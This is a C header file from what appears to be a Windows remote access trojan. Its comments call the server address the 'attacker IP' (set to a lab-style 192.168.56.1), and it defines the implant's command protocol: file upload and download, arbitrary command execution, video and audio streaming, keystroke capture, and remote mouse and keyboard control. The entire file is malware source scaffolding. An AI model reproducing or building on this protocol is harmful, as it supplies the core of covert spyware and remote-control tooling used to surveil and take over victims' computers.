/*
This header file will include all Windows headers needed for the program
All #define constants will also been included in this file
*/

#pragma once

#define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this
#define WINVER 0x0500 // required to use SendInput() function

#include <winsock2.h> // windows socket header
#include <shlwapi.h> // useful functions for directory traversal
#include <stdio.h> // standard input/output
// TODO - use C++ strings
#include <string.h> // standard string functions
#include <windows.h> // include this last to avoid repeat declarations

// tell the compiler to link necessary libraries
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")

// attacker IP and primary communication port
//#define SERVER_ADDR "127.0.0.1"
#define SERVER_ADDR "192.168.56.1"
#define SERVER_CMD_PORT 42967
#define SERVER_VIDEO_PORT 42968
#define SERVER_INPUT_PORT 42969

// change directory and list directory contents
#define CHANGE_DIR 1
#define LIST_DIR 2
// upload and download files (from attacker's perspective)
#define UPLOAD 3
#define DOWNLOAD 4
// run an arbitrary comamnd
#define RUN_CMD 5
// start and end video, mouse, and audio streams
#define START_VIDEO 6
#define END_VIDEO 7
#define START_MOUSE 8
#define END_MOUSE 9
#define START_AUDIO 10
#define END_AUDIO 11
#define START_KEYS 13
#define END_KEYS 14
// end the process
#define KILL_PROC 12
// constants for controlling the mouseand keyboard
/*
Frame layout:
	START_INPUTS input_type input_values input_type input_values ... END_INPUTS
*/
#define MOUSE_POS 17 // this will be followed by X, Y coords for the mouse
#define MOUSE_DOWN 18 // this will be followed by MOUSE_LEFT, MOUSE_RIGHT, or MOUSE_MIDDLE
#define MOUSE_UP 19 // same as MOUSE_DOWN
#define MOUSE_LEFT 20
#define MOUSE_RIGHT 21
#define MOUSE_MIDDLE 22
#define MOUSE_WHEEL 23 // this will be followed by a number to specify the scroll amount
#define KEY_DOWN 24 // this will be followed by a Windows virtual-key code
#define KEY_UP 25 // same as KEY_DOWN
#define START_INPUTS 26 // beginning of input list
#define END_INPUTS 27 // end of input list